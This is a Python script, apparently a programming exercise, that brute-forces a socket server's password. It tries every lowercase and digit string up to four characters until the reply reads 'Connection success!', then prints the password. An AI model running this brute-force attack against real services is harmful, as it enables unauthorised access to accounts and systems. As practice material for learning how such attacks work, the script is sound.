import argparse
import socket
import string
import itertools


def gen_pass():
    my_iter = []
    chars = string.ascii_lowercase
    digits = list(range(0, 10))
    for i in range(1,5):
        my_iter += list(itertools.product(itertools.chain(chars, digits), repeat=i))
    for el in my_iter:
        yield merge_tuple(el)


def merge_tuple(tup):
    s_result = ''
    for c in tup:
        s_result += str(c)
    return s_result


def main():
    parser = argparse.ArgumentParser(description='Connects to the given IP address.')

    parser.add_argument('ip', metavar='ip', type=str, help='server IP')
    parser.add_argument('port', metavar='port', type=int, help='port')
    #parser.add_argument('message', metavar='message', type=str, help='message to be send to server')

    # Execute the parse_args() method
    args = parser.parse_args()

    passwords = gen_pass()

    with socket.socket() as client_socket:
        address = (args.ip, args.port)
        client_socket.connect(address)

        response = "Wrong password!"
        while response != 'Connection success!':
            passw = next(passwords)
            data = passw.encode(encoding='UTF-8')
            client_socket.send(data)
            response = client_socket.recv(1024)
            response = response.decode(encoding='UTF-8')

        if response == 'Connection success!':
            print(passw)

if __name__ == "__main__":
    main()